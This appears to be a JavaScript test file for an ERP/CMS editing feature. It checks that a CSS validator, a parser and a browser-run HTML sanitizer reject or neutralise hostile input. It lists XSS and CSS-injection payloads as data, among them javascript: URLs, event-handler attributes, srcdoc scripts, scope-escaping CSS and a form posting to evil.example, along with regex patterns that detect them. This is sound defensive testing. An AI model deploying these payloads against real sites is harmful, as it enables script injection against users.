// tests/erp-edits.test.mjs
// Hostile-payload tests for the ERP edits integration: the parser and custom
// CSS validator (lib/erp-edits-shared.ts, run in Node) and the HTML sanitizer
// (components/cms/erp-html.ts, run in a real Chromium DOM via Playwright).
// Run: npm run test:erp   (Node 24+, `npx playwright install chromium` once)
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { stripTypeScriptTypes } from 'node:module';
import { test } from 'node:test';
import { chromium } from 'playwright';

const shared = await import('../lib/erp-edits-shared.ts');
const { isSafeCustomCss, parsePageEdits, isSafeThemeStyle } = shared;

test('custom CSS: accepts normal nested CSS', () => {
  for (const css of [
    '& { padding: 40px; background: #f5f0e8 } .grid { display: grid; gap: 24px }',
    '@media (max-width: 767px) { .grid { grid-template-columns: 1fr } }',
    '.hero { background-image: url("https://cdn.example.com/a.jpg") }',
    ".hero { background: url( 'https://cdn.example.com/a.jpg' ) }",
    '.q::before { content: "\\201C" } /* a } comment */',
  ]) {
    assert.equal(isSafeCustomCss(css), true, css);
  }
});

test('custom CSS: rejects anything that escapes the scope or loads code', () => {
  for (const css of [
    '} body{display:none}',
    '& {} } body { display: none } {',
    'a{content:"/*"} } body{display:none} a{content:"*/"}',
    'a{content:"x\n} body{display:none}',
    '/* unterminated',
    '\\7d body{display:none}',
    '.x{background:url(http://tracker.example/a.png)}',
    '.x{background:url(javascript:alert(1))}',
    '.x{background:url(data:image/svg+xml,abc)}',
    '@import url("https://evil.example/x.css");',
    '.x{width:expression(alert(1))}',
    '.x{behavior: url(https://x/y.htc)}',
    '.x{-moz-binding:url(https://x/y.xml)}',
    '</style><script>alert(1)</script>',
    '.x{color:red',
    'x'.repeat(20001),
  ]) {
    assert.equal(isSafeCustomCss(css), false, css.slice(0, 60));
  }
});

test('parser: keeps sections, drops invalid custom CSS and unsafe theme values', () => {
  const edits = parsePageEdits({
    patches: [{ selector: 'h1', styles: { padding: '12px 24px 12px 24px', margin: '-8px 0 0 0', position: 'fixed' } }],
    operations: [
      { action: 'insert', selector: 'main', id: 'a1', html: '<p>x</p>', kind: 'custom', css: '} body{display:none}' },
      { action: 'insert', selector: 'main', id: 'a2', html: '<p>x</p>', kind: 'custom', css: '& { padding: 4px }' },
      {
        action: 'insert',
        selector: 'main',
        id: 'a3',
        html: '<p>x</p>',
        theme: { btn: { 'background-color': '#c9a55b', color: 'url(https://x)', 'border-radius': '0px' }, script: { color: 'red' } },
      },
      { action: 'insert', selector: 'main', id: 'bad id!', html: '<p>x</p>' },
    ],
  });
  const [patch, a1, a2, a3] = edits;
  assert.equal(edits.length, 4);
  assert.deepEqual(patch.styles, [
    ['padding', '12px 24px 12px 24px'],
    ['margin', '-8px 0 0 0'],
  ]);
  assert.equal(a1.kind, 'custom');
  assert.equal(a1.css, undefined);
  assert.equal(a2.css, '& { padding: 4px }');
  assert.deepEqual(a3.theme, [['btn', [['background-color', '#c9a55b'], ['border-radius', '0px']]]]);
  assert.equal(isSafeThemeStyle('-moz-binding', 'x'), false);
});

/* ------------------------------ sanitizer ------------------------------ */

async function sanitizerSource() {
  const strip = async (path) => stripTypeScriptTypes(await readFile(new URL(path, import.meta.url), 'utf8'));
  const sharedJs = await strip('../lib/erp-edits-shared.ts');
  const htmlJs = (await strip('../components/cms/erp-html.ts')).replace(/^import .*erp-edits-shared.*$/m, '');
  return `${sharedJs}\n${htmlJs}\nwindow.__sanitize = (html, mode) => {
    const box = document.createElement('div');
    box.append(sanitizeErpHtml(html, mode));
    return box.innerHTML;
  };`;
}

const HOSTILE = [
  '<img src="x" onerror="alert(1)">',
  '<img src="https://cdn.example.com/a.jpg" onerror="alert(1)">',
  '<script>alert(1)</script>',
  '<a href="javascript:alert(1)">js</a>',
  '<a href="  JaVaScRiPt:alert(1)">js2</a>',
  '<a href="data:text/html,<script>alert(1)</script>">data</a>',
  '<iframe src="https://evil.example/embed"></iframe>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>" src="https://www.youtube.com/embed/x"></iframe>',
  '<svg onload="alert(1)"><use href="#x"></use><foreignObject><img src=x onerror=alert(1)></foreignObject><path d="M0 0" onclick="alert(1)"/></svg>',
  '<svg><script>alert(1)</script><animate attributeName="href" to="javascript:alert(1)"/></svg>',
  '<form action="https://evil.example"><input name="card"><button formaction="javascript:alert(1)">Go</button></form>',
  '<object data="x"></object><embed src="x">',
  '<style>body{display:none}</style>',
  '<div style="background:url(javascript:alert(1));color:red" onmouseover="alert(1)">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<video src="javascript:alert(1)" poster="http://ok.example/p.jpg" onplay="alert(1)"></video>',
  '<p data-erp-clone="other">clash</p>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
].join('');

test('sanitizer: hostile HTML is neutralised in every mode', async (t) => {
  // Playwright's own Chromium, else an installed Chrome or Edge.
  const browser = await chromium
    .launch()
    .catch(() => chromium.launch({ channel: 'chrome' }))
    .catch(() => chromium.launch({ channel: 'msedge' }));
  t.after(() => browser.close());
  const page = await browser.newPage();
  const dialogs = [];
  page.on('dialog', (dialog) => {
    dialogs.push(dialog.message());
    dialog.dismiss();
  });
  await page.setContent('<!doctype html><html><head></head><body></body></html>');
  await page.addScriptTag({ type: 'module', content: await sanitizerSource() });
  await page.waitForFunction(() => typeof window.__sanitize === 'function');

  for (const mode of ['rich', 'section', 'custom']) {
    const out = await page.evaluate(([html, m]) => window.__sanitize(html, m), [HOSTILE, mode]);
    assert.doesNotMatch(out, /<script|<style|<object|<embed|<form|<input|<use|foreignobject|<math|<animate/i, mode);
    assert.doesNotMatch(out, /\son[a-z]+=/i, `${mode}: event handler`);
    assert.doesNotMatch(out, /javascript:|data:text\/html|expression\(/i, `${mode}: script URL`);
    assert.doesNotMatch(out, /evil\.example|srcdoc/i, `${mode}: foreign iframe`);
    assert.doesNotMatch(out, /data-erp-clone/i, `${mode}: clone marker`);
    // Insert it for real: nothing may run.
    await page.evaluate((html) => (document.body.innerHTML = html), out);
  }
  await page.waitForTimeout(300);
  assert.deepEqual(dialogs, []);

  // Allowed content survives.
  const custom = await page.evaluate(() =>
    window.__sanitize(
      '<div class="grid" style="display:grid;background:url(https://cdn.example.com/b.jpg)"><iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe>' +
        '<svg viewBox="0 0 10 10"><path d="M0 0L10 10" fill="url(#g)"/></svg><button type="submit">Hi</button></div>',
      'custom',
    ),
  );
  assert.match(custom, /<iframe src="https:\/\/www\.youtube\.com\/embed\/abc"/);
  assert.match(custom, /<svg viewBox="0 0 10 10"><path d="M0 0L10 10" fill="url\(#g\)"/);
  assert.match(custom, /<button type="button">/);
  assert.match(custom, /style="display:grid;background:url\(https:\/\/cdn\.example\.com\/b\.jpg\)"/);

  const section = await page.evaluate(() =>
    window.__sanitize(
      '<a class="erp-btn erp-btn-outline" href="/book">Book</a><a class="x" href="/a">A</a>' +
        '<div class="erp-cards"><div class="erp-card"><h3>C</h3></div></div><div class="other">u</div>' +
        '<span style="font-size:20px;color:red">big</span><iframe src="https://www.youtube.com/embed/x"></iframe>',
      'section',
    ),
  );
  assert.match(section, /<a class="erp-btn erp-btn-outline" href="\/book">/);
  assert.match(section, /<a href="\/a">A<\/a>/);
  assert.match(section, /<div class="erp-cards"><div class="erp-card"><h3>C<\/h3><\/div><\/div>u/);
  assert.match(section, /<span style="font-size:20px">big<\/span>/);
  assert.doesNotMatch(section, /iframe/);

  const rich = await page.evaluate(() =>
    window.__sanitize('<p><strong>Bold</strong> <a href="https://x.example" target="_blank">link</a></p><h2>T</h2><ul><li>i</li></ul>', 'rich'),
  );
  assert.equal(
    rich,
    '<p><strong>Bold</strong> <a href="https://x.example/" target="_blank" rel="noopener noreferrer">link</a></p>Ti',
  );
});
